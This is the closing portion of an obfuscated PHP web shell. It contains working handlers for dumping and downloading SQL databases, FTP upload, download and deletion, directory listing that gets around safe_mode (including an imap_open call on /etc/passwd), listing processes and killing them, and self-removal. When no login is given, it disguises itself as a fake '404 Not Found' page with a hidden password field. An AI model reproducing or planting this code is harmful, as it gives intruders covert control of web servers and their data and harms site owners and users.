$q_sql_result; $q_sql_result=''; } } } } if($q_sql_connect_error!=""){ echo $q_sql_connect_error; } } if(@isset($q_sql_action)&&$q_sql_action=="dump"){ $fp=0; if(@isset($q_sql_save2file)&&$q_sql_save2file=="1"&&@isset($q_sql_filename)&&!@empty($q_sql_filename)){ $fp=@fopen($q_sql_filename,"w"); } $q_sql_filename=@str_replace("_db_","_".$q_sql_db."_",$q_sql_filename); $sql=new my_sql(); $sql->db=$q_sql_engine; $sql->host=$q_sql_server; $sql->port=$q_sql_port; $sql->user=$q_sql_user; $sql->pass=$q_sql_pass; $sql->base=$q_sql_db; $q_sql_dumped=""; if(!$sql->connect()){ echo z3q(z9y("419")); }elseif(!$sql->select_db()){ echo z3q(z9y("447")); }elseif(!$sql->dump($q_sql_table)){ echo z3q(z9y("458")); }else{ foreach($sql->dump as $v) $q_sql_dumped.=$v."\r\n"; if(@isset($q_sql_download)&&$q_sql_download=="1"){ @ob_clean(); @header("Content-type: application/octet-stream"); @header("Content-length: ".@strlen($q_sql_dumped)); @header("Content-disposition: attachment; filename=\"".@basename($q_sql_filename)."\";"); echo $q_sql_dumped; exit(); } if(!@isset($q_sql_save2file)||$q_sql_save2file!="1"){ echo z9m('2').z6f().z6q().z5w('','1').@htmlspecialchars($q_sql_dumped).z5q().z7f().z7y().z10q().z6s(); }else if($fp||@function_exists('file_put_contents')){ if(@fwrite($fp,$q_sql_dumped) or @fputs($fp,$q_sql_dumped) or @file_put_contents($q_sql_filename,$q_sql_dumped)){ z3q(z9y("459")); }else{ echo z3q(z9y("450")); } }else{ echo z3q(z9y("450")); } } } } } if($act=="selfremove"){ if(@isset($dconfirm)&&$dconfirm){ if($saddr!="127.0.0.1") echo z3q((@unlink('index.php')?z9y("462"):z9y("463",'index.php'))); } else { echo z3q(z9y("460")); echo z6s().z10w(z7u(z6l(z7n(z9y("461")).z5x(array("act"=>"selfremove","d","dconfirm"=>"1"),z8b(z9y("21"),"7")).z9x().z5x($back_form_actions,z8b(z9y("22"),'7')))),"2").z6s(); } } if($act=='ftp'){ $a_transfer=array("FTP_BINARY"=>"FTP_BINARY", "FTP_ASCII"=>"FTP_ASCII"); $hmsg=''; $hideconnect=0; $jsid=0; if(@isset($ftp_server)&&!@isset($ftp_passive)) $ftp_passive=0; if(!@isset($ftp_server)&&!@isset($ftp_passive)) $ftp_passive="1"; if(@isset($ft)&&$ft=="logoff"){ if(@isset($_SESSION['ftp_server'])){ z0i('ftp_current_dir'.$_SESSION['ftp_server']); } z0i('ftp_server'); z0i('ftp_username'); z0i('ftp_password'); z0i('ftp_port'); z0i('ftp_passive'); z0i('ftp_session'); } $ftp_session=0; if(@isset($_SESSION['ftp_session'])){ $ftp_server=$_SESSION['ftp_server']; $ftp_username=$_SESSION['ftp_username']; $ftp_password=$_SESSION['ftp_password']; $ftp_port=$_SESSION['ftp_port']; $ftp_passive=$_SESSION['ftp_passive']; $ftp_session=1; } if(!@empty($ftp_server)&&!@empty($ftp_port)&&!@empty($ftp_username)&&!@empty($ftp_password)&&!@isset($ftp_quickaction)){ $ftp=new ftp($ftp_server,$ftp_port,$ftp_username,$ftp_password,$ftp_passive); if($ftp->loggedOn){ if(!@isset($ftp_current_dir)||@empty($ftp_current_dir)){ $ftp_current_dir=z1k((@isset($_SESSION['ftp_current_dir'.$ftp_server])?$_SESSION['ftp_current_dir'.$ftp_server]:'/')); } if(@isset($rd)) $ftp_current_dir = z1k($ftp_current_dir.$rd); $ftp->setCurrentDir($ftp_current_dir); $ftp_current_dir=$ftp->currentDir; $_SESSION['ftp_current_dir'.$ftp_server]=$ftp_current_dir; $_SESSION['ftp_server']=$ftp_server; $_SESSION['ftp_username']=$ftp_username; $_SESSION['ftp_password']=$ftp_password; $_SESSION['ftp_port']=$ftp_port; $_SESSION['ftp_passive']=$ftp_passive; $_SESSION['ftp_session']=1; $hideconnect=1; $hmsg=z5x(array("act"=>"ftp","d","ft"=>"logoff"),z8b(z9y("196"), "1")); } else { $hmsg=z9y("191"); } } if(!@isset($ftp_server)||@empty($ftp_server)) $ftp_server="127.0.0.1"; if(!@isset($ftp_port)||@empty($ftp_port)) $ftp_port="21"; if(!@isset($ftp_username)||@empty($ftp_username)) $ftp_username="anonymous"; if(!@isset($ftp_password)||@empty($ftp_password)) $ftp_password="anonymous@ftp.com"; if(!@isset($ftp_localfile)||@empty($ftp_localfile)) $ftp_localfile=$d; if(!@isset($ftp_remotefile)||@empty($ftp_remotefile)) $ftp_remotefile="/ftp-dir/somefile.txt"; if($hideconnect){ if(@isset($lmkdir)&&$lmkdir&&@isset($ldir)&&!@empty($ldir)){ @mkdir($d.$ldir); } if(@isset($fmkdir)&&$fmkdir&&@isset($fdir)&&!@empty($fdir)){ $ftp->makeDir(z1k($ftp_current_dir).$fdir); } $ltarr=array(); $rtarr=array(); if(@isset($action)&&!@empty($action)&&(@isset($ltall)||@isset($rtall))){ $ft=$action; if(@isset($rtall)||@strstr($rtall,"\n")){ $rtarr=@explode("\n", $rtall); } elseif(@isset($ltall)||@strstr($ltall,"\n")){ $ltarr=@explode("\n", $ltall); } } if(@isset($ft)){ switch($ft){ case "delete": if(@isset($lt)&&!@empty($lt)&&z4r($lt)){ z8s($lt); } elseif(@isset($rt)&&!@empty($rt)) { $ftp->deleteObject(z1k($ftp_current_dir).$rt); } elseif(@count($ltarr)>0){ foreach($ltarr as $lto){ $lto=@trim($lto); if(!@empty($lto)&&z4r($lto)){ z8s($lto); } } } elseif(@count($rtarr)>0){ foreach($rtarr as $rto){ $rto=@trim($rto); if(!@empty($rto)){ $ftp->deleteObject(z1k($ftp_current_dir).$rto); } } } break; case "upload": if(@isset($lt)&&!@empty($lt)&&z4r($lt)){ $ftp->putObject($lt, z1k($ftp_current_dir)); } elseif(@count($ltarr)>0){ foreach($ltarr as $lto){ $lto=@trim($lto); if(!@empty($lto)&&z4r($lto)){ $ftp->putObject($lto, z1k($ftp_current_dir)); } } } break; case "download": if(@isset($rt)&&!@empty($rt)) { $ftp->getObject(z1k($ftp_current_dir).$rt, $d); } elseif(@count($rtarr)>0){ foreach($rtarr as $rto){ $rto=@trim($rto); if(!@empty($rto)){ $ftp->getObject(z1k($ftp_current_dir).$rto, $d); } } } break; default: break; } } $frml=z9y("194").z9x().z5x(array('act'=>'ftp','d','lmkdir'=>'1'),z6u('ldir','','2').z8b(z9y("195"),'7')); $frmf=z9y("194").z9x().z5x(array('act'=>'ftp','d','fmkdir'=>'1'),z6u('fdir','','2').z8b(z9y("195"),'7')); echo z3q(array(z10w(z7u(z7k(z9y("192")).z6z($frml)),'2'),z10w(z7u(z7k(z9y("193").z9x().$hmsg).z6z($frmf)),'2')),'4'); $listf=$ftp->ftpRawList(); $listl=z8x($d); $lsl=array(); $lsl["d"]=array(); $lsl["l"]=array(); $lsl["f"]=array(); $lsf=array(); $lsf["d"]=array(); $lsf["l"]=array(); $lsf["f"]=array(); if(@is_array($listl)&&@count($listl)>0){ foreach($listl as $lf){ $fn=z2l($lf); if($fn!='.'&&$fn!='..'){ if(z4j($lf)){ $lsl["d"][]=array($lf, 'DIR'); }elseif(z4q($lf)){ $lsl["l"][]=array($lf, 'LINK'); } else { $lsl["f"][]=array($lf, (@filesize($lf)!==false?@filesize($lf):'FILE')); } } } } if(@is_array($listf)&&@count($listf)>0){ foreach($listf as $rf){ if($rf[1]!='.'&&$rf[1]!='..'){ if($rf[0]=='d'){ $lsf["d"][]=array($rf[1], 'DIR'); } elseif($rf[0]=='l'){ $rfd=(@strstr($rf[1],' -> ')?@substr($rf[1],0,@strpos($rf[1],' -> ')):$rf[1]); $lsf['l'][]=array($rfd, 'LINK'); } else { $lsf['f'][]=array($rf[1],$rf[2]); } } } } if(!@isset($flsort)){ if(@isset($_SESSION['flsort'])){ $flsort=$_SESSION['flsort']; } else { $flsort='0a'; } } $_SESSION['flsort'] = $flsort; $pflsort=z5r($flsort); if($pflsort[1]!='a') $pflsort[1]='d'; $v=$pflsort[0]; @usort($lsl["d"],"z2b"); @usort($lsl["l"],"z2b"); @usort($lsl["f"],"z2b"); if($pflsort[1]=="d"){ $lsl["d"]=@array_reverse($lsl["d"]); $lsl["l"]=@array_reverse($lsl["l"]); $lsl["f"]=@array_reverse($lsl["f"]); } if(!@isset($ffsort)){ if(@isset($_SESSION['ffsort'])){ $ffsort=$_SESSION['ffsort']; } else { $ffsort='0a'; } } $_SESSION['ffsort'] = $ffsort; $pffsort=z5r($ffsort); $ffsort=$pffsort[0].$pffsort[1]; if($pffsort[1]!='a') $pffsort[1]='d'; $v=$pffsort[0]; @usort($lsf["d"],"z2b"); @usort($lsf["l"],"z2b"); @usort($lsf["f"],"z2b"); if($pffsort[1]=="d"){ $lsf["d"]=@array_reverse($lsf["d"]); $lsf["l"]=@array_reverse($lsf["l"]); $lsf["f"]=@array_reverse($lsf["f"]); } $list_l=array(); $list_f=array(); $list_l[]=array($d.'..', 'LINK'); $list_f[]=array('..', 'LINK'); foreach($lsl["d"] as $lf) $list_l[]=$lf; foreach($lsl["l"] as $lf) $list_l[]=$lf; foreach($lsl["f"] as $lf) $list_l[]=$lf; foreach($lsf["d"] as $rf) $list_f[]=$rf; foreach($lsf["l"] as $rf) $list_f[]=$rf; foreach($lsf["f"] as $rf) $list_f[]=$rf; $cl=@count($list_l); $cf=@count($list_f); echo z9m('2').z6f().z7j('','4'); z8n('l'); echo z7f().z7j('','46'); z8n('f'); echo z7f().z7y().z10q(); echo z9m('2').z7o().z7j('','4').z5z('',"1").z9m('2'); echo z7u( z7k(z5x(array('act','d','ffsort','flsort'=>($pflsort[0]=='0'?'0'.($pflsort[1]=="a"?"d":"a"):'0'.$pflsort[1])),z8b(z9y("57").($pflsort[0]=='0'?' '.($pflsort[1]=="a"?'&uarr;':'&darr;'):''),'3')),'8','2'). z6z(z5x(array('act','d','ffsort','flsort'=>($pflsort[0]=='1'?'1'.($pflsort[1]=="a"?"d":"a"):'1'.$pflsort[1])),z8b(z9y("58").($pflsort[0]=='1'?' '.($pflsort[1]=="a"?'&uarr;':'&darr;'):''),'3')),'8',''). z7k(z9y("62"),'8','3')); for($i=0;$i<$cl;$i++){ $disp=z2l($list_l[$i][0]); if((!@is_numeric($list_l[$i][1]) && $list_l[$i][1]=='DIR')||$disp=='..'){ $o=z5x(array('act'=>'ftp','flsort','ffsort','d'=>$list_l[$i][0]),z8h('small_dir','','9').z8b(z8o($disp,40),'10',z3g($disp,'d'))); } else { $ext=z2l($list_l[$i][0],'.'); $o=z5x(array('act'=>'ftp','flsort','ffsort','d','ft'=>'upload','lt'=>$list_l[$i][0]),z8h($ext,'','9').z8b(z8o($disp,40),'11',z3g($disp,'f'))); } echo z7u(z7k($o,'19','2').z6z((@is_numeric($list_l[$i][1])?z7x($list_l[$i][1]):$list_l[$i][1]),'10').z7k(($disp=='..'?z0w($list_l[$i][0]):z0t($list_l[$i][0]).z4n($list_l[$i][0],'idloc',($i%2?'tra':'trb').$jsid)),'10'),($i%2? '0': '1'),($i%2?'tra':'trb').$jsid); $jsid++; } echo z10q().z5h().z7f().z7j('','46').z5z('',"1").z9m('2'); echo z7u( z7k(z5x(array('act','d','flsort','ffsort'=>($pffsort[0]=='0'?'0'.($pffsort[1]=="a"?"d":"a"):'0'.$pffsort[1])),z8b(z9y("57").($pffsort[0]=='0'?' '.($pffsort[1]=="a"?'&uarr;':'&darr;'):''),'3')),'8','2'). z6z(z5x(array('act','d','flsort','ffsort'=>($pffsort[0]=='1'?'1'.($pffsort[1]=="a"?"d":"a"):'1'.$pffsort[1])),z8b(z9y("58").($pffsort[0]=='1'?' '.($pffsort[1]=="a"?'&uarr;':'&darr;'):''),'3')),'8',''). z7k(z9y("62"),'8','3')); for($i=0;$i<$cf;$i++){ $disp=z2l($list_f[$i][0]); if((!@is_numeric($list_f[$i][1])&&$list_f[$i][1]=="DIR")||$disp=='..'){ $o=z5x(array('act'=>'ftp','flsort','ffsort','d','rd'=>$list_f[$i][0]),z8h('small_dir','','9').z8b(z8o($disp,40),'10',z3g($disp,'d'))); } else { $ext=z2l($list_f[$i][0],'.'); $o=z5x(array('act'=>'ftp','flsort','ffsort','d','ft'=>'download','rt'=>$list_f[$i][0]),z8h($ext,'','9').z8b(z8o($disp,40),'11',z3g($disp,'f'))); } echo z7u(z7k($o,'19','2').z6z((@is_numeric($list_f[$i][1])?z7x($list_f[$i][1]):$list_f[$i][1]),'10').z7k(($disp=='..'?z0q($list_f[$i][0]):z0r($list_f[$i][0]).z4n($list_f[$i][0],'idftp',($i%2?'tra':'trb').$jsid)),'10'),($i%2? '0': '1'),($i%2?'tra':'trb').$jsid); $jsid++; } echo z10q().z5h(). z7f().z7y().z10q(); echo z9m('2').z7o().z7j('','4'). z0s('idloc','ltall',z9v('act').z9v('flsort').z9v('ffsort').z9v('d').z9v('ftpmloc','1'),array(''=>z9y("66"),'upload'=>z9y("197"),'delete'=>z9y("199"))). z7f().z7j('','4'). z0s('idftp','rtall',z9v('act').z9v('flsort').z9v('ffsort').z9v('d').z9v('ftpmrem','1'),array(''=>z9y("66"),'download'=>z9y("198"),'delete'=>z9y("199"))). z7f().z7y().z10q(); } else { echo z3q(z9y("185").z9x().($hmsg!=''?' : '.$hmsg:'')); echo z6s().z10w(z7u(z5x(array("act"=>"ftp","d"), z6l(z7n(z9y("186")).z6u("ftp_server",$ftp_server,'5').z6u("ftp_port",$ftp_port,'6')).z6l(z7n(z9y("187")).z6u("ftp_username",$ftp_username,'5')).z6l(z7n(z9y("188")).z6u("ftp_password",$ftp_password,'5').z8b(z9y("189"),'7').' '.z5u("ftp_passive1",z9y("190"), "ftp_passive")))),'2').z6s(); $dmsg=$umsg=''; if(!@empty($ftp_server)&&!@empty($ftp_port)&&!@empty($ftp_username)&&!@empty($ftp_password)&&@isset($ftp_quickaction)){ $ftp=new ftp($ftp_server,$ftp_port,$ftp_username,$ftp_password,$ftp_passive); if($ftp->loggedOn){ if($ftp_quickaction=="upload"){ $umsg=($ftp->put($ftp_remotefile, $ftp_localfile) ? z9y("208") : z9y("209")); } elseif($ftp_quickaction=="download"){ $dmsg=($ftp->get($ftp_remotefile,$ftp_localfile,1) ? z9y("210") : z9y("211")); } } else { if($ftp_quickaction=="upload"){ $umsg=z9y("191"); } else { $dmsg=z9y("191"); } } } echo z3q(array(z9y("200").z9x().($dmsg!=''?" : ".$dmsg:''),z9y("201").z9x().($umsg!=''?" : ".$umsg:'')),'46'); echo z10w(z9d(z9c( z5x(array('act'=>'ftp','ftp_quickaction'=>'download','d'), z10w(z5b(). z7u(z5t(z9y("202")).z9c(z6u('ftp_server',$ftp_server,'2').z6u('ftp_port',$ftp_port,'6'))). z7u(z5t(z9y("203")).z9c(z6u('ftp_username',$ftp_username,'4').z6u('ftp_password',$ftp_password,'5'))). z7u(z5t(z9y("204")).z9c(z6u('ftp_remotefile',$ftp_remotefile,'0'))). z7u(z5t(z9y("205")).z9c(z6u('ftp_localfile',$ftp_localfile,'0'))). z7u(z5t('').z9c(z8b(z9y("207"),'7').z5u("ftp_passive2",z9y("190"), "ftp_passive"))).z5b() ) ),'','4'). z9c(z5x(array('act'=>'ftp','ftp_quickaction'=>'upload','d'), z10w(z5b(). z7u(z5t(z9y("202")).z9c(z6u('ftp_server',$ftp_server,'2').z6u('ftp_port',$ftp_port,'6'))). z7u(z5t(z9y("203")).z9c(z6u('ftp_username',$ftp_username,'4').z6u('ftp_password',$ftp_password,'5'))). z7u(z5t(z9y("205")).z9c(z6u('ftp_localfile',$ftp_localfile,'0'))). z7u(z5t(z9y("204")).z9c(z6u('ftp_remotefile',$ftp_remotefile,'0'))). z7u(z5t('').z9c(z8b(z9y("206"),'7').z5u("ftp_passive3",z9y("190"), "ftp_passive"))).z5b() ) ),'','46')),'2'); } } if($act=='ls'){ if(!@isset($sort)){ if(@isset($_SESSION['sort'])){ $sort=$_SESSION['sort']; } else { $sort=z7z('3','default_sort'); } } $_SESSION['sort'] = $sort; if(!@isset($ftarget)) $ftarget=''; if(!@isset($fullpath)) $fullpath=0; if(!@isset($with_ls)) $with_ls=0; if(@isset($ls_a) && @count($ls_a)>0){ $list=$ls_a; } else { $list=z8x($d); $showbuf=0; } $ugstat=0; $jsid=0; if(z7e('posix_getpwuid')&&z7e('posix_getgrgid')&&z7e('fileowner')&&z7e('filegroup')) $ugstat=1; if(!@isset($nolsmenu)||!$nolsmenu){ z2n(); if(z1y($d)) z4i(); } z5o(); if(@count($list)>0){ $obj=array(); $inf=array(); $obj["h"]=array(); $obj["d"]=array(); $obj["l"]=array(); $obj["f"]=array(); foreach($list as $v){ $o=z2l($v); $t='f'; $t2='d'; if(($o==".") || ($o=="..")){ $t='d'; } elseif(@z4j($v)){ $t='d'; if(z4q($v)){ $t2='l'; } } elseif(@z4q($v)){ $t='l'; } if($t=='f') { if(z5i($v)) $t='e'; } elseif($t=='l'){ if(z5i($v)) $t2='e'; } if(@isset($filter) && !z1q($v, $filter,$t)) continue; if($with_ls){ $inf[$v]=z4s($v,$t); } else { $fileperms=@fileperms($v); if(!$fileperms&&$nix&&$sh_exec){ $inf[$v]=z4s($v,$t); } } $row=array(); if($o=="."){ $row[]=$d.$o; $row[]="LINK"; }elseif($o==".."){ $row[]=$d.$o; $row[]="LINK"; }elseif($t=='d'){ $row[]=$v; $row[]=(($t2=='l')? "LINK":"DIR"); }elseif($t=='f'||$t=='e'||$t=='l'){ $row[]=$v; $row[]=(@isset($inf[$v])?$inf[$v][1] : @filesize($v)); } $row[]=(@isset($inf[$v])?$inf[$v][2] :@filemtime($v)); if($nix){ if(@isset($inf[$v])){ $row[]=$inf[$v][3]; } else { if($ugstat){ $ow=@posix_getpwuid(@fileowner($v)); $gr=@posix_getgrgid(@filegroup($v)); $row[]=array(($ow["name"]?$ow["name"]:@fileowner($v)),($gr["name"]?$gr["name"]:@filegroup($v))); }else{ $row[]=array('unk','unk'); } } } $row[]=(@isset($inf[$v])?$inf[$v][4]:$fileperms); $row[]=$t; $row[]=$t2; if(($o==".") || ($o=="..")){ if($o=='..') $obj["h"][]=$row; }elseif($t=='l'){ $obj["l"][]=$row; }elseif($t=='d'){ $obj["d"][]=$row; }elseif($t=='f'||$t=='e'){ $obj["f"][]=$row; } } $row=array(); $row[]=z9y("57"); $row[]=z9y("58"); $row[]=z9y("59"); if(!$win){ $row[]=z9y("60"); } $row[]=z9y("61"); $row[]=z9y("62"); $psort=z5r($sort); if($psort[1]!='a'){ $psort[1]='d'; } else { $psort[1]='a'; } if(!@isset($nohead)||!$nohead){ for($i=0;$i<@count($row)-1;$i++){ $row[$i]=z5x(array('act','d','filter','sort'=>($i==$psort[0]?$i.($psort[1]=="a"?"d":"a"):$i.$psort[1])),z8b($row[$i].($i==$psort[0]?' '.($psort[1]=="a"?'&uarr;':'&darr;'):''),'3',($i=="1"?' style="text-align: right;"':''))); } } $v=$psort[0]; @usort($obj["d"],"z2b"); @usort($obj["l"],"z2b"); @usort($obj["f"],"z2b"); if($psort[1]=="d"){ $obj["d"]=@array_reverse($obj["d"]); $obj["l"]=@array_reverse($obj["l"]); $obj["f"]=@array_reverse($obj["f"]); } $obj=@array_merge($obj["h"],$obj["d"],$obj["l"],$obj["f"]); $tab=array(); $tab["c"]=array($row); $tab["h"]=array(); $tab["d"]=array(); $tab["l"]=array(); $tab["f"]=array(); $i=0; foreach($obj as $a){ if(@is_array($a)&&@count($a)>=6){ $v=$a[0]; $t=$a[(@count($a)-2)]; $t2=$a[(@count($a)-1)]; $o=z2l($v); $dir=z3a($v); if($fullpath){ if(@substr($v, 0, @strlen($d)) == $d){ $disp=@substr($v,@strlen($d)); } else { $disp=$v; } }else{ $disp=$o; } $disp=z8o($disp,60); $row=array(); if($o=="."){ $row[]=z5x(array('act'=>'ls','d'=>$v),z8h('small_dir','','9').z8b($disp,'10'),$ftarget); $row[]="LINK"; }elseif($o==".."){ $row[]=z5x(array('act'=>'ls','d'=>$v),z8h('small_dir','','9').z8b($disp,'10'),$ftarget); $row[]="LINK"; }elseif($t=='d'){ if($t2=='l'){ if(@readlink($v)) $disp.=" => ".@readlink($v); $type="LINK"; $row[]=z5x(array('act'=>'ls','d'=>$v),z8h('small_dir','','9').z8b($disp,'10',z3g($o,'d')),$ftarget); }else{ $type="DIR"; $row[]=z5x(array('act'=>'ls','d'=>$v),z8h('small_dir','','9').z8b($disp,'10',z3g($o,'d')),$ftarget); } $row[]=$type; }elseif($t=='f'||$t=='e'||$t=='l'){ $ext=@strtolower(z2l($v,'.')); $row[]=z5x(array('act'=>'f','d'=>$dir,'f'=>$o),z8h($ext,'','9',(($t=='e'||$t2=='e')?'1':'')).z8b($disp,'11',z3g($o,'f')),$ftarget); $row[]=(@isset($inf[$v])?$a[1]:z7x($a[1])); } $row[]=(@isset($inf[$v])? $a[2] : @date("Y.m.d H:i",$a[2])); if($nix){ $row[]=$a[3][0]."/".$a[3][1]; } $row[]=z6t((@isset($inf[$v])?$a[4]: z9w(@fileperms($v))),z6g($v)); if($t=='d'&&$o!='..'){ $row[]=z1r($v,($ftarget?'1':'')).z4n($v,'ls','replacejsid'.$jsid); $jsid++; }else{ if($o!='.'&&$o!='..'){ $row[]=z0o($v,$ftarget).z4n($v,'ls','replacejsid'.$jsid); $jsid++; }else{ $row[]=z0z($v,$ftarget); } } if(($o=='.') || ($o=='..')){ if($o=='..') $tab["h"][]=$row; }elseif($t=='l'){ $tab["l"][]=$row; }elseif($t=='d'){ $tab["d"][]=$row; }elseif($t=='f'||$t=='e'){ $tab["f"][]=$row; } $i++; } } $table=@array_merge($tab["c"],$tab["h"],$tab["d"],$tab["l"],$tab["f"]); $trid=0; if(@count($table)>0){ echo z9m('2').z7o().z7j('','4').z5z('',"2"); echo z9m('2'); $cnt=0; foreach($table as $row){ $r= ''; $cnt2=0; foreach($row as $v){ if($cnt==0){ $r.= (($cnt2==0) ? z9c($v,'7',"2") : (($cnt2==1) ? z6z($v,'8'):($cnt2==(@count($row)-1)?z9c($v,'8','3'):z9c($v,'8')))); } else { $r.=(($cnt2==0) ? z9c($v,'9') : (($cnt2==1) ? z6z($v,'10'):z9c($v,'10'))); } $cnt2++; } $trids=''; if(@strpos($r,'id="replacejsid')!==false){ $trids="tr".($cnt%2?'a':'b'); $r=@str_replace('id="replacejsid','id="'.$trids, $r); $trids.=$trid; $trid++; } echo z7u($r,($cnt%2? '0': '1'), $trids); $cnt++; } echo z10q(); echo z5h().z7f().z7y().z10q(); $arr_select=array(''=>z9y("66")); if(@isset($use_buffer)&&$use_buffer&&(!@isset($nolsmenu)||!$nolsmenu)){ $arr_select["bcopy"]=z9y("67"); $arr_select["bcut"]=z9y("68"); $ucopy=$ucut=0; if(@isset($bcopy)&&@is_array($bcopy)&&@count($bcopy)>0){ $arr_select["bunsetcopy"]=z9y("69"); $ucopy=1; } if(@isset($bcut)&&@is_array($bcut)&&@count($bcut)>0){ $arr_select["bunsetcut"]=z9y("70"); $ucut=1; } if($ucopy&&$ucut) $arr_select["bunsetall"]=z9y("71"); } $arr_select["delete"]=z9y("72"); echo z0s('ls','lsall',z9v('act').z9v('d'),$arr_select); } } else { if(z7e('imap_open')&&z7e('imap_list')&&@version_compare(@phpversion(),"5.2.0")<=0) $sls_arr["imap"]="imap_list (safe_mode / PHP <= 5.1.2)"; if(z7e('glob')) $sls_arr["glob"]="glob (PHP <= 5.2.x + some others)"; if(z7e('realpath')) $sls_arr["realpath"]="realpath (PHP <= 5.2.4 + some others)"; if(@isset($sls_arr["glob"])&&!@isset($submit1)&&!@isset($listdir_func)){ $submit1=1; $listdir_func="glob"; } elseif(@isset($sls_arr["realpath"])&&!@isset($submit1)&&!@isset($listdir_func)){ $submit1=1; $listdir_func="realpath"; } if(@count($sls_arr)>0){ echo z3q(z9y("125")); echo z6s(); echo z9m("2").z6f().z6q(); echo z5w('',"1"); if(@isset($submit1)&&$submit1){ switch($listdir_func){ case 'imap': $stream=@imap_open('/etc/passwd',"",""); $dir_list=@imap_list($stream,@trim($d),"*"); for($i=0;$i<@count($dir_list);$i++) echo @htmlspecialchars($dir_list[$i])."\r\n"; @imap_close($stream); break; case 'glob': z3w($d); break; case 'realpath': z3y($d); break; } } echo z5q(); echo z7f().z7y().z10q(); echo z10w(z7u(z6l(z5z("left","3").z5x(array("act","submit1"=>"1"), z10w(z7u(z9c(z7n(z9y("126")).z5y("d",$d,"0","","9").z3m("listdir_func",$sls_arr,"5",1).z8b(z9y("127"),"7"))),"2")).z5h())),"2"); echo z6s(); } else { echo z3q(z9y("464",$d)); } } } if($act=='processes'){ if(!@isset($sortp)) $sortp=($nix?'1a':'0a'); $header=''; if($nix){ $h='ps -aux'.((@isset($grep)&&$grep)?'|grep "'.$grep.'"|grep -v grep':''); if(@isset($pid)&&$pid){ if(!@isset($sig)||@is_null($sig)){ $sig=9; } $header=" : ".z9y("349",array($sig,$pid)).(@posix_kill($pid,$sig)?z9y("350"):z9y("351")); } }else{ $h='tasklist'; } $r=z9e($h); echo z3q(z9y("348").$header,'1'); if($r){ $r=z2v('  ',' ',$r); $ppsort=z5r($sortp); if($ppsort[1]!='a'){ $ppsort[1]='d'; } else { $ppsort[1]='a'; } if($nix){ $stack=@explode("\n",$r); $head=@explode(' ',$stack[0]); if(!@isset($grep)||!$grep){ unset($stack[0]); } for($i=0;$i<@count($head);$i++){ if($i!=$ppsort[0]){ $head[$i]=z5x(array('act','d','pfilter','sortp'=>$i.$ppsort[1]),z8b($head[$i],'3')); } else { $head[$i]=z5x(array('act','d','pfilter','sortp'=>$ppsort[0].($ppsort[1]=='a'?'d':'a')),z8b($head[$ppsort[0]].' '.($ppsort[1]=='a'?'&uarr;':'&darr;'),'3')); } } $head[]=z9y("62"); $prcs=array(); if(!@isset($pfilter)||@empty($pfilter)||$pfilter=='---'){ $bool=0; $pfilter=''; } else { $bool=1; } foreach($stack as $line){ if(!@empty($line)){ $line=@explode(" ",$line); if(($bool&&$pfilter==$line[0])||!$bool){ $line[0]=z5x(array('act'=>'processes','d','sortp','pfilter'=>(($bool&&$pfilter==$line[0])?'---':$line[0])),z8b($line[0],'1',(($line[0]==$cuser)?' style="color:'.z9q("okcolor").';"':''))); $line[10]=@join(" ",@array_slice($line,10)); $line=@array_slice($line,0,11); $line[]=z5x(array('act'=>'processes','d','sortp','pfilter','pid'=>$line[1],'sig'=>'9'),z8b(z9y("392"),"7")); $prcs[]=$line; } } } }else{ $r=@convert_cyr_string($r,"d","w"); $stack=@explode("\n",$r); unset($stack[0],$stack[2]); $stack=@array_values($stack); $stack=@array_slice($stack,1); $head[0]="PROGRAM"; $head[1]="PID"; if($ppsort[0]>=@count($head)){ $ppsort[0]=@count($head)-1; } for($i=0;$i<@count($head);$i++){ if($i!=$ppsort[0]){ $head[$i]=z5x(array('act','d','sortp'=>$i.$ppsort[1]),z8b($head[$i],'3')); } else { $head[$i]=z5x(array('act','d','sortp'=>$ppsort[0].($ppsort[1]=='a'?'d':'a')),z8b($head[$ppsort[0]].' '.($ppsort[1]=='a'?'&uarr;':'&darr;'),'3')); } } $prcs=array(); foreach($stack as $line){ if(!@empty($line)){ $ln=@explode(" ",$line); if(@count($ln)>=2) $prcs[]=array($ln[0],$ln[1]); } } } $v=$ppsort[0]; @usort($prcs,"z2b"); if($ppsort[1]=="d"){ $prcs=@array_reverse($prcs); } $tab=array(); if(!@isset($grep)||!$grep){ $tab[]=$head; } $tab=@array_merge($tab,$prcs); echo z9m('2'); $cnt=0; foreach($tab as $i=>$k){ $r=''; $cnt2=0; foreach($k as $j=>$v){ if($win and $i>0 and $j==2){ $v=z7x($v); } if($cnt==0){ $r.=(($cnt2==0) ? z7k($v,'13','2'):($cnt2==(@count($k)-1)?z7k($v,'13','3'):z7k($v,'13'))); } else { $r.=(($cnt2==0) ? z7k($v,'14','2'):($cnt2==(@count($k)-1)?z7k($v,'14','3'):z7k($v,'14'))); } $cnt2++; } echo z7u($r,($cnt%2? '0': '1')); $cnt++; } echo z10q(); } } z3j();
} else {
?>
<html>
<head>
<title>
404 Not Found
</title>
</head>
<body>
<h1>Not Found</h1> 
<p>The requested URL <?=$_SERVER['REQUEST_URI']?> was not found on this server.
<br />
<br />
Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.
</p> 
<hr> 
<address><?=$_SERVER['SERVER_SOFTWARE']?> Server at <?=$_SERVER['SERVER_NAME']?> Port 80</address> 
    <style> 
        input { margin:0;background-color:#fff;border:1px solid #fff; } 
    </style> 
    <center> 
    <form method="post"> 
    <input type=password name=pwd> 
    </form></center> 
</div>
</body>
</html>